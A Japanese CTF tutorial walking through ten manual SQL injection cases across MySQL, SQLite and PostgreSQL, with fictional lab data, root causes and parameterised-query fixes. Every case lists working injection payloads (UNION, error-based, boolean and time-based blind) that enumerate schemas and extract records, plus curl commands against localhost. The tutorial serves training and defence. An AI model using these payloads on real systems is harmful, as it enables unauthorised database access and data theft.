# SQLインジェクション：手動CTFケーススタディ10題

> **用途**：自分で構築した検証環境、または攻撃が許可されたCTFのみ。すべてのドメイン、データベース、テーブル、ラベル、フラグは**架空**です。実在サービスへの試行、個人情報・認証情報の収集には使用しません。
>
> **想定**：SQLmapなし。ブラウザの検索欄または `curl` でHTTPを送り、レスポンスとSQLの意味を一段ずつ確認する。各ケースのレスポンスは**教材用想定例**であり、実際の稼働サイトで観測したものではありません。

## 0. 最初に知っておく3つの区別

**(1) 通常検索が動くこと ≠ SQLiがないこと**。検索欄の入力がSQLリテラルへ連結されていても、普通の文字列は単に一致検索になる。`'` など文法上意味のある記号を送って初めて破綻が露出することがある。

**(2) エラー ≠ SQLiの確定**。入力検証、Webフレームワークの例外、DBの構文エラーを区別する。SQLiと判断するには、同じ元条件での真／偽の変化、UNIONで制御した表示、あるいはDB固有関数の再現など複数の根拠を使う。

**(3) データベース名・テーブル名・列名・値は別の情報**。MySQL系の `DATABASE()`、`information_schema.tables`、`information_schema.columns`、対象テーブルの `SELECT` は、それぞれ別の段階。SQLiteには同じ `DATABASE()` 関数はない。

### 全ケース共通の架空データ

MySQL / PostgreSQL / SQLiteの各独立CTF環境に、基本的に次の架空データがあるとする。

- MySQL/PostgreSQLのDB名：`ctf_market`（SQLiteは接続先のデータベースファイル内の `main` スキーマ）
- 商品テーブル：`products(id, name, is_active, campaign)`
- 学習用テーブル：`practice_records(id, label)`
- 学習用レコード：`(1, 'CTF{PRACTICE_ONLY}')`
- 商品例：`(1, 'Alpha', 1, 'demo')`、`(2, 'Omega', 1, 'demo')`、`(3, 'Travel Kit', 1, 'demo')`

`CTF{PRACTICE_ONLY}` は架空データであり、どこかの実CTFの正解ではない。列挙できるメタデータはDBユーザーの権限やDBMSによって変わる。

## 1. CTFで毎回使う手動チェックシート

| 手順 | 操作 | 観測するもの | 推論の限界 |
|---|---|---|---|
| A | 通常ヒット・通常0件を確認 | 200 / 表示文 / 件数 / 長さ | SQL実装はまだ不明 |
| B | `'`、括弧などを1つだけ追加 | DBエラー、500、表示の変化 | エラーだけではSQLi確定しない |
| C | 文脈に合わせて真と偽を比較 | 同一条件で違う結果になるか | キャッシュ・検索条件も考慮 |
| D | DBMS・列数・出力可能列を確かめる | SQL方言、型、表示箇所 | UNIONが使えない場所もある |
| E | DB→表→列→演習レコードへ進む | `information_schema` 等 | 列挙権限の制約がある |
| F | 原因と防御を説明する | SQL組立コード・PDO等 | エラー隠蔽だけでは修正不足 |

HTTP送信例。`BASE`は自分のローカル演習のURLだけに設定すること。

```bash
BASE='http://127.0.0.1:8767'
# 変更点が読みやすいようURLエンコードをcurlに任せる
curl -i -G "$BASE/lab/sql/vuln" --data-urlencode 'name=Travel Kit'
# 受け取ったHTTPの状態コード、HTML本文、件数を比較
```

**重要な注意**：以下の例で使うMySQLの `-- -` は、`--` の直後に空白が必要という規則を満たす形。PostgreSQL/SQLiteでは `--` から行末がコメント。実際の元SQLに括弧やLIMIT等があれば、閉じ方が変わる。

---

## CASE 01 — 普通に動く商品検索。シングルクォートからUNIONへ（MySQL）

**画面**：`/items?name=...`。`Travel Kit` は1件、`NoSuch` は0件。普通の検索では問題がない。

**開発者側のSQL（演習では公開）**：

```sql
SELECT id, name FROM products WHERE name = '<name>';
```

**段階①：最初の異常**

```text
Travel Kit'
```

想定徴候：`SQL syntax; error 1064 near ...`、またはHTTP 500。理由：もともと `name = 'Travel Kit'` となる場所へ余分な `'` が入り、引用符の対応が崩れたため。ただし、フレームワーク側の入力例外でも500は起こり得る。

**段階②：真偽対照**

```sql
Travel Kit' AND 1=1 -- -
Travel Kit' AND 1=2 -- -
```

1件／0件の差を確認する。`AND` の左辺 `name='Travel Kit'` が真だから、追加条件の真偽が直接結果に反映される。`NoSuch' AND 1=1` ではもともと0件なので対照として不適切。

**段階③：列数を確定する**

```sql
Travel Kit' ORDER BY 2 -- -
Travel Kit' ORDER BY 3 -- -
```

想定：`ORDER BY 2` は成功、`ORDER BY 3` は「選択列数を超える」エラー。これは`SELECT`の返却列が2個であることの状況証拠。`ORDER BY`が外側のクエリに作用する構文文脈である必要がある。

**段階④：UNIONでどこが画面に表示されるか調べる**

```sql
NoSuch' UNION SELECT NULL,'MARKER' -- -
```

`MARKER` が商品名欄に表示されれば、2列目が画面への出力経路。`NULL`は型の不一致を避けるための仮置き。

**段階⑤：DB名 → テーブル名 → 列名 → 演習データ**

```sql
NoSuch' UNION SELECT NULL,DATABASE() -- -
NoSuch' UNION SELECT NULL,(SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() ORDER BY table_name LIMIT 1 OFFSET 0) -- -
NoSuch' UNION SELECT NULL,(SELECT column_name FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='practice_records' ORDER BY ordinal_position LIMIT 1 OFFSET 1) -- -
NoSuch' UNION SELECT NULL,(SELECT label FROM practice_records ORDER BY id LIMIT 1) -- -
```

想定表示は順に `ctf_market` → `practice_records` → `label` → `CTF{PRACTICE_ONLY}`。教材の架空DBでは、表名の辞書順先頭が`practice_records`であり、最初は名前を知らずに列挙している。これは4つの別々の情報源にアクセスしている。もし最後が出ないなら、`label`列が存在しない、アクセス権限がない、返却列がWeb画面に出ないなどを分離して調べる。

**根本原因**：文字列連結でSQLを組み立てること。**防御**：`WHERE name = ?` とパラメータを分離し、DB利用ユーザーには必要最小限の権限のみ与える。

---

## CASE 02 — UNIONが表示されず、EXTRACTVALUEのエラーだけ見える（MySQL）

**画面**：`/lookup?name=Travel Kit`。通常検索は正常。追加したSQLの結果行は画面に表示されないが、DBの例外文がそのまま出るというCTF設定。

**元SQL**：

```sql
SELECT id FROM products WHERE name = '<name>';
```

**段階①：発端**

```sql
Travel Kit'
```

想定：SQL文法エラー。これだけでは列挙できない。SQLiの真偽対照も行っておく。

```sql
Travel Kit' AND 1=1 -- -
Travel Kit' AND 1=2 -- -
```

**段階②：XPath関数が利用でき、エラーが応答へ表示されるか**

```sql
Travel Kit' AND EXTRACTVALUE(1,CONCAT(0x7e,'CHECK')) -- -
```

想定：`XPATH syntax error: '~CHECK'`。`0x7e`はチルダ `~`。不正なXPathを第2引数へ渡し、DBが返したエラー文をWebアプリが漏らしている。**`EXTRACTVALUE()` が使えるかはDB製品・環境次第。MySQL 8.0/8.4公式マニュアルにも記載があるため、「8系では必ず削除」は誤り。**

**段階③：DB → テーブル → 列 → 演習データ**

```sql
Travel Kit' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE())) -- -
Travel Kit' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() ORDER BY table_name LIMIT 1 OFFSET 0))) -- -
Travel Kit' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='practice_records' ORDER BY ordinal_position LIMIT 1 OFFSET 1))) -- -
Travel Kit' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT label FROM practice_records LIMIT 1))) -- -
```

想定エラー断片：`~ctf_market`、`~practice_records`、`~label`、`~CTF{PRACTICE_ONLY}`。大きい値はエラー文長の制限で途中切れになる場合がある。

**なぜ期待通り表示されない場合があるか**：`AND`の左辺に一致行がない、SQLオプティマイザーによる評価順の差、例外がWebでマスクされている、関数が使えない、対象テーブルへのアクセス権がない、など。エラーがないことは安全性の証明ではない。

**防御**：プレースホルダー、DB例外の外部非表示、DB権限の制限。エラー隠蔽だけでSQLiの根本原因は解決しない。

---

## CASE 03 — 200 OKだが「複数／見つからない」だけ変化するBoolean Blind（MySQL）

**画面**：`/stock?name=Travel Kit`。DBエラーは非表示、データそのものも表示しない。文字だけ「複数」または「検索できませんでした」。

**元SQL**：

```sql
SELECT COUNT(*) FROM products WHERE name = '<name>';
```

**段階①：Syntaxエラーの兆候**：`Travel Kit'` は500または統一された検索失敗表示。エラー本文が出なくても、真偽の再現性で判断する。

**段階②：同一ベース値でTRUE/FALSE**：

```sql
Travel Kit' AND 1=1 -- -
Travel Kit' AND 1=2 -- -
```

理由：一致商品があるので、TRUEではCOUNT>0、FALSEではCOUNT=0。応答文言を並べて判定する。

**段階③：DB名の存在・長さ・先頭文字を推定**：

```sql
Travel Kit' AND LENGTH(DATABASE())=10 -- -
Travel Kit' AND ASCII(SUBSTRING(DATABASE(),1,1))=99 -- -
Travel Kit' AND ASCII(SUBSTRING(DATABASE(),2,1))=116 -- -
```

`ctf_market` は10文字、先頭は `c` (ASCII 99)、次は `t` (116)。**Blindは「値の文字列そのもの」が表示されるのではなく、条件の真偽を1ビットずつ聞く仕組み**。先頭から一文字ずつ調べると再構成できる。

**段階④：未知のテーブル名・カラム名を一文字ずつ抽出する**：

```sql
Travel Kit' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() ORDER BY table_name LIMIT 1 OFFSET 0),1,1))=112 -- -
Travel Kit' AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='practice_records' ORDER BY ordinal_position LIMIT 1 OFFSET 1),1,1))=108 -- -
```

最初は`table_name`が分からないので、最初のテーブル名の先頭文字が`p`（112）かを真偽で判定し、`SUBSTRING(...,2,1)` などで `practice_records` を復元する。復元後に初めてそのテーブルを指定して列名を調べる。例では2番目の列名`label`の先頭 `l`（108）を確認する。複数の表がある場合は `LIMIT 1 OFFSET 1` 等で行を進める。

**復元した名前が存在するか追加確認**：

```sql
Travel Kit' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE() AND table_name='practice_records')=1 -- -
Travel Kit' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='practice_records' AND column_name='label')=1 -- -
```

**段階⑤：演習用の値を先頭文字から確認**：

```sql
Travel Kit' AND ASCII(SUBSTRING((SELECT label FROM practice_records ORDER BY id LIMIT 1),1,1))=67 -- -
```

`67`は`C`。以後の位置を変えて文字列を再構成する。文字のコードポイントや文字コードによって `ASCII()` より `ORD()` などを検討すべき場面もある。

**誤判定の代表例**：検索0件が「偽」とは限らない。左辺自体が偽、キャッシュが返っている、入力が正規化されているなど。必ず同一ベース文字列を使い、複数回比較する。

**防御**：パラメータ化に加え、外部へのDB内部情報露出を減らす。画面にエラーを出さないだけではBlind SQLiは防げない。

---

## CASE 04 — `LIKE '%入力%'` の検索。`%'` が意味を持つ（MySQL）

**画面**：`/search?q=...`。「商品名の一部」を検索。普通の単語は問題なく検索できる。

**元SQL**：

```sql
SELECT id, name FROM products WHERE name LIKE '%<q>%';
```

**段階①：兆候**：`q=Kit'`で引用符が壊れる場合がある。ただし、閉じるべき元の文字列が `'%...%'` なので、等価検索とは構文が違う。

**段階②：元の文字列境界を意識する**：

```sql
%' UNION SELECT NULL,'MARKER' -- -
```

元のSQLへ代入すると概念上、`WHERE name LIKE '%%' UNION SELECT NULL,'MARKER' -- - %'` となる。**攻撃文字列に含まれる `%` は文字列の終端ではなくLIKEのワイルドカード**、`'` がSQL文字列を閉じる。`-- -` の後ろはコメント。演習用の元SQLがLIKEでないならこの組合せは合わない。

**段階③：DB・表・列・値**：

```sql
%' UNION SELECT NULL,DATABASE() -- -
%' UNION SELECT NULL,(SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() ORDER BY table_name LIMIT 1 OFFSET 0) -- -
%' UNION SELECT NULL,(SELECT column_name FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='practice_records' ORDER BY ordinal_position LIMIT 1 OFFSET 1) -- -
%' UNION SELECT NULL,(SELECT label FROM practice_records ORDER BY id LIMIT 1) -- -
```

**失敗時の観測**：結果が多すぎて `MARKER` を見落としている場合、UNIONの2列目が描画されない場合、`LIMIT`が元SQLの最後についている場合などがある。「表示されない＝SQLiではない」とはならない。

**防御**：`WHERE name LIKE ?` を使い、`%`を検索仕様に応じてアプリ側で組み立ててバインドする。必要なら `%` と `_` をリテラル検索するエスケープ仕様も定義する。

---

## CASE 05 — 数値ID。引用符なしでも成立する（MySQL）

**画面**：`/item?id=3`。商品詳細は正常に表示される。

**元SQL**：

```sql
SELECT id, name FROM products WHERE id = <id>;
```

**段階①：兆候**：

```sql
3'
```

数値として組み込まれた場所へ`'`を加えると構文が崩れ、1064などが発生し得る。**ここは元SQLが引用符なしなので、UNION時に `'` で閉じる必要はない**。

**段階②：真偽の比較**：

```sql
3 AND 1=1
3 AND 1=2
```

**段階③：UNIONからDB→表→列→値**：

```sql
-1 UNION SELECT NULL,DATABASE() -- -
-1 UNION SELECT NULL,(SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() ORDER BY table_name LIMIT 1 OFFSET 0) -- -
-1 UNION SELECT NULL,(SELECT column_name FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='practice_records' ORDER BY ordinal_position LIMIT 1 OFFSET 1) -- -
-1 UNION SELECT NULL,(SELECT label FROM practice_records ORDER BY id LIMIT 1) -- -
```

`-1`は例の商品のIDに存在しないことを想定した値で、元の商品の表示行を抑えるためのもの。**数値型のフィールドはクォートがないから安全、という考えは誤り**。

**防御**：`id = ?` で整数としてバインドし、さらに数値の妥当性検証も行う。

---

## CASE 06 — WHERE句に括弧がある。`')` まで閉じないとエラー（MySQL）

**画面**：`/active?name=Travel Kit`。通常検索では1件。

**元SQL**：

```sql
SELECT id, name FROM products
WHERE (name = '<name>') AND is_active = 1;
```

**段階①：兆候**：`Travel Kit'`はSQLエラーになる場合がある。真偽対照を作るなら、引用符と括弧の両方を閉じる必要がある。

**段階②：構文を合わせる**：

```sql
Travel Kit') AND 1=1 -- -
Travel Kit') AND 1=2 -- -
```

`name='Travel Kit'`の終端は `'`、グループ化を閉じるのは`)`、そのあと追加条件を置く。`'`だけで止めると元SQLの`)`との対応を見失う。

**段階③：表示列とメタデータ**：

```sql
NoSuch') UNION SELECT NULL,'MARKER' -- -
NoSuch') UNION SELECT NULL,DATABASE() -- -
NoSuch') UNION SELECT NULL,(SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() ORDER BY table_name LIMIT 1 OFFSET 0) -- -
NoSuch') UNION SELECT NULL,(SELECT column_name FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='practice_records' ORDER BY ordinal_position LIMIT 1 OFFSET 1) -- -
NoSuch') UNION SELECT NULL,(SELECT label FROM practice_records ORDER BY id LIMIT 1) -- -
```

**原因**：元のSQLの文法を知らないとペイロードが成立しない。`Syntax error`は必ずしも「インジェクション不可」ではなく、「閉じる括弧が足りない」可能性がある。

**防御**：括弧はSQLテンプレートに固定し、値のみパラメータ化する。

---

## CASE 07 — Web検索欄ではなくJSON POSTの検索（MySQL）

**画面**：検索ボタンを押してもURLにクエリが付かない。ブラウザのNetworkでは`POST /api/search`、JSON本文は `{"name":"Travel Kit"}`。

**元SQL（悪い実装例）**：

```sql
SELECT id, name FROM products WHERE name = '<JSON.name>';
```

**段階①：兆候**：JSONの`name`に `Travel Kit'` を入れると500／SQL syntax error。

`curl`だけでJSONを送る最小例：

```bash
cat > /tmp/ctf-search.json <<'JSON'
{"name":"Travel Kit'"}
JSON
curl -i -X POST 'http://127.0.0.1:8767/api/search' \
  -H 'Content-Type: application/json' \
  --data-binary @/tmp/ctf-search.json
```

`/api/search` はこのケースの**架空エンドポイント**。同梱のSQLiteミニ演習サーバーとは別の想定サイト。`curl`が動かなくてもHTTP本文を組み立てる意味が分かればよい。

**段階②：SQL内の入力文字列（JSONのname値）**：

```sql
Travel Kit' AND 1=1 -- -
Travel Kit' AND 1=2 -- -
NoSuch' UNION SELECT NULL,'MARKER' -- -
```

**段階③：DB→表→列→値（いずれも `name` の中に入る文字列）**：

```sql
NoSuch' UNION SELECT NULL,DATABASE() -- -
NoSuch' UNION SELECT NULL,(SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() ORDER BY table_name LIMIT 1 OFFSET 0) -- -
NoSuch' UNION SELECT NULL,(SELECT column_name FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='practice_records' ORDER BY ordinal_position LIMIT 1 OFFSET 1) -- -
NoSuch' UNION SELECT NULL,(SELECT label FROM practice_records ORDER BY id LIMIT 1) -- -
```

**重要**：JSON自体に正しくエスケープされた文字列が入っていても、サーバーがそれをSQLへ文字列連結すればSQLiは成立し得る。JSONの構文が正しいこととSQLの安全性は独立。

**防御**：JSONスキーマによる入力検証とDBパラメータバインドを別々に行う。JSONの入力検証だけに頼らない。

---

## CASE 08 — ORDER BYだけが入力で変更できる（MySQL、表示差Blind）

**画面**：`/list?sort=name`。`Alpha` と `Omega` が一覧表示される。検索テキストではなく「並び替え」指定に不備がある。

**元SQL**：

```sql
SELECT id, name FROM products WHERE is_active=1 ORDER BY <sort>;
```

**段階①：兆候**：`sort=(` のような不完全なSQL式でsyntax error。元のSQLが `ORDER BY name` に変換されているなら、文字列リテラルを閉じる `'` は不要。

**段階②：真偽で並び順を入れ替える**：

```sql
CASE WHEN 1=1 THEN name ELSE REVERSE(name) END
CASE WHEN 1=2 THEN name ELSE REVERSE(name) END
```

`Alpha`→`Omega`の順と、`REVERSE(name)`でソートしたときの`Omega`→`Alpha`の順を区別する。元データが別の文字列なら、必ずこの順になるわけではない。

**段階③：DB → テーブル → 列 → 演習レコードの真偽を確認**：

```sql
CASE WHEN ASCII(SUBSTRING(DATABASE(),1,1))=99 THEN name ELSE REVERSE(name) END
CASE WHEN ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() ORDER BY table_name LIMIT 1 OFFSET 0),1,1))=112 THEN name ELSE REVERSE(name) END
CASE WHEN ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='practice_records' ORDER BY ordinal_position LIMIT 1 OFFSET 1),1,1))=108 THEN name ELSE REVERSE(name) END
CASE WHEN ASCII(SUBSTRING((SELECT label FROM practice_records LIMIT 1),1,1))=67 THEN name ELSE REVERSE(name) END
```

TRUE時は通常順、FALSE時は逆文字列の順になる設計。ここでは**DB名を丸ごと表示できない**。名前の各文字、テーブル名候補、列名候補、データ文字を真偽で検証して進む。

**罠**：`ORDER BY`に渡す列名・方向（ASC/DESC）は普通の値プレースホルダーにできない。**ホワイトリストを使い、アプリ内の固定SQL識別子へマッピングする**のが基本対策。

---

## CASE 09 — Cookie経由の時間差Blind（MySQL）

**画面**：`/offers`。検索UIは正常でHTTP本文もほぼ同じ。Cookieの`campaign=demo`がDBの条件に不適切に連結されているCTF設定。

**元SQL**：

```sql
SELECT id,name FROM products WHERE campaign='<cookie.campaign>';
```

**段階①：兆候**：Cookie値を `demo'` にすると一部の環境では500、別の環境では汎用エラーページ。

**段階②：時間差が観測できるか**：

```sql
demo' AND IF(1=1,SLEEP(2),0)=0 -- -
demo' AND IF(1=2,SLEEP(2),0)=0 -- -
```

TRUE条件は`SLEEP(2)`を実行して時間がかかり、FALSE条件は待機を要求しない。**HTTP時間差はノイズが大きい**ため1回の観測で断定しない。アプリやDBの最適化・行数により期待と違う場合がある。

```bash
curl -sS -o /dev/null -w 'time_total=%{time_total}\n' \
  -H "Cookie: campaign=demo' AND IF(1=1,SLEEP(2),0)=0 -- -" \
  'http://127.0.0.1:8767/offers'
```

このURLも架空のCTFエンドポイント。再現可能なローカルサーバーでのみ試す。

**段階③：DB → テーブル → 列 → 演習データ（各条件は2秒の有無でTRUE/FALSEを判定）**：

```sql
demo' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))=99,SLEEP(2),0)=0 -- -
demo' AND IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() ORDER BY table_name LIMIT 1 OFFSET 0),1,1))=112,SLEEP(2),0)=0 -- -
demo' AND IF(ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='practice_records' ORDER BY ordinal_position LIMIT 1 OFFSET 1),1,1))=108,SLEEP(2),0)=0 -- -
demo' AND IF(ASCII(SUBSTRING((SELECT label FROM practice_records LIMIT 1),1,1))=67,SLEEP(2),0)=0 -- -
```

**結果の解釈**：遅延が発生したら「その判定式は真と考えられる」、遅延しなければ「偽、または式が評価されなかった可能性」。ネットワーク負荷、回線品質、キャッシュなどを除外すること。

**防御**：Cookieも未信頼入力。パラメータ化とタイムアウト・負荷監視。短い時間差の観測だけで誤報を作らない。

---

## CASE 10 — SQLite / PostgreSQLではMySQLの関数を使い回せない（DBMS比較）

**同じ画面**：`/items?name=...`。通常検索は問題なし。内部DBはCTFの問題ごとに変わる。

### 10-A SQLite版

**元SQL**：`SELECT id,name FROM products WHERE name='<name>';`

1. `Travel Kit'` → `unrecognized token` / `incomplete input`など、実装次第でsyntax error。
2. `NoSuch' UNION SELECT NULL,sqlite_version() --` → SQL方言の手掛かり。
3. SQLiteはMySQLの`DATABASE()`とは異なり、`sqlite_schema` / `sqlite_master`で表情報を見る。DBファイルの`main`スキーマに接続している想定。

```sql
NoSuch' UNION SELECT NULL,sqlite_version() --
NoSuch' UNION SELECT NULL,(SELECT name FROM sqlite_schema WHERE type='table' ORDER BY name LIMIT 1 OFFSET 0) --
NoSuch' UNION SELECT NULL,(SELECT name FROM pragma_table_info('practice_records') ORDER BY cid LIMIT 1 OFFSET 1) --
NoSuch' UNION SELECT NULL,(SELECT label FROM practice_records LIMIT 1) --
```

想定：SQLiteバージョン → `practice_records` → `label` → `CTF{PRACTICE_ONLY}`。`pragma_table_info` はSQLiteのテーブル値PRAGMA。**SQLiteにはMySQLの`information_schema.columns`はない**。

このケースだけは同梱のPythonミニ演習で動作再現できる（下記参照）。

### 10-B PostgreSQL版

**元SQL**：`SELECT id,name FROM products WHERE name='<name>';`

```sql
Travel Kit'
Travel Kit' AND CAST((SELECT current_database()) AS integer)=1 --
```

`current_database()` が文字列 `ctf_market` を返すため整数へのCASTが失敗し、条件が評価される環境なら `invalid input syntax for type integer: "ctf_market"` のような**型変換エラー**が出る。これはSQLの文法エラーとは異なり、実行時に値を整数として解釈できないことによるエラー。

**UNIONを利用したDB→表→列→値**：

```sql
NoSuch' UNION SELECT NULL,current_database() --
NoSuch' UNION SELECT NULL,(SELECT table_name FROM information_schema.tables WHERE table_schema='public' ORDER BY table_name LIMIT 1 OFFSET 0) --
NoSuch' UNION SELECT NULL,(SELECT column_name FROM information_schema.columns WHERE table_schema='public' AND table_name='practice_records' ORDER BY ordinal_position LIMIT 1 OFFSET 1) --
NoSuch' UNION SELECT NULL,(SELECT label FROM public.practice_records ORDER BY id LIMIT 1) --
```

PostgreSQLは `public` などのスキーマとDB（`current_database()`）を区別する。MySQLの `DATABASE()` や `IF(...,SLEEP(...),...)` をそのまま持ち込まない。

**防御**：どのDBMSでも、SQL文にユーザー入力を直接連結しないことが第一。DBMS固有のエラー名だけに依存しない。

---

## 2. 症状別の切り分け：思い込みを防ぐ

| 観測された現象 | よくある理由 | 次に考えること |
|---|---|---|
| `'`で500 | SQL構文不一致、別の入力処理例外 | 元SQL文脈・真偽対照で再確認 |
| 真／偽で両方0件 | 元のWHERE条件が既に偽 | 確実にヒットするベース値を使う |
| UNIONで列数不一致 | 返却列数が違う | `NULL`で同数の列を構成する |
| UNION成功なのに表示されない | 出力列が画面へ描画されない／元行に埋もれる | `MARKER`を各列へ移動して検証 |
| `Unknown column` | SQL識別子を間違えた、参照権限がない | `information_schema.columns`で確認 |
| `Subquery returns more than 1 row` | スカラーサブクエリが複数行を返した | `ORDER BY ... LIMIT 1`で限定 |
| `FUNCTION ... does not exist` | DBMSが異なる、関数がない | DBMS・バージョンを調べる |
| エラーが画面に表示されない | 例外をWeb層が隠す | Boolean／描画差／時間差の観測へ |
| 200でも表示が違う | 成功応答内にアプリ独自の判定がある | ステータスでなく本文・DOMを比較 |
| エラーが大量 | SQL文脈が違う／DB差／防御装置 | 一度に一要素だけ変えて因果を観測 |

## 3. 終了時に「原因と修正」を説明する

**危険な擬似コード**：

```python
sql = "SELECT id,name FROM products WHERE name='" + request_name + "'"
```

**安全な擬似コード**：

```python
sql = "SELECT id,name FROM products WHERE name=?"
rows = db.execute(sql, (request_name,)).fetchall()
```

パラメータ化では値がSQL構文の一部として再解析されない。認可不足、広すぎるDB権限、画面への生の例外表示も別途対策が必要。**エスケープやWAFのみを唯一の対策にしないこと**。

## 4. CTFの回答を書き残すテンプレート

```text
CASE番号：
1. 入口：URL／Method／パラメータ名
2. 通常のヒット／0件：
3. 追加した1文字と結果：
4. DBMSの推定根拠：
5. 真条件／偽条件の差：
6. DB名（架空）：
7. テーブル名（架空）：
8. カラム名（架空）：
9. 演習データ（架空）：
10. SQLのどの境界を突破したか：
11. 攻撃が成立する前提（DBMS・権限・表示）：
12. 修正方法と修正後に再確認する症状：
```

## 5. 公式資料・検証根拠

1. OWASP Web Security Testing Guide, Testing for SQL Injection: https://owasp.github.io/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Injection/05-SQL_Injection
2. PortSwigger Web Security Academy, SQL Injection UNION Attacks: https://portswigger.net/web-security/sql-injection/union-attacks
3. PortSwigger SQL Injection Cheat Sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet
4. MySQL 8.0, INFORMATION_SCHEMA COLUMNS: https://dev.mysql.com/doc/refman/8.0/en/information-schema-columns-table.html
5. MySQL 8.0, XML functions incl. `ExtractValue()`: https://dev.mysql.com/doc/refman/8.0/ja/xml-functions.html
6. MySQL 8.4, XML functions: https://dev.mysql.com/doc/refman/8.4/en/xml-functions.html
7. SQLite, The Schema Table: https://www.sqlite.org/schematab.html
8. SQLite, PRAGMA table_info: https://www.sqlite.org/pragma.html
9. PostgreSQL, Information Schema Tables: https://www.postgresql.org/docs/current/infoschema-tables.html
10. PostgreSQL, Information Schema Columns: https://www.postgresql.org/docs/current/infoschema-columns.html
11. OWASP SQL Injection Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html

**エビデンスの扱い**：SQL文法・関数・メタデータ表の存在は各公式資料に依拠。画面応答・DB名・架空フラグは教材の想定例で、実際のサイトの観測事実ではない。
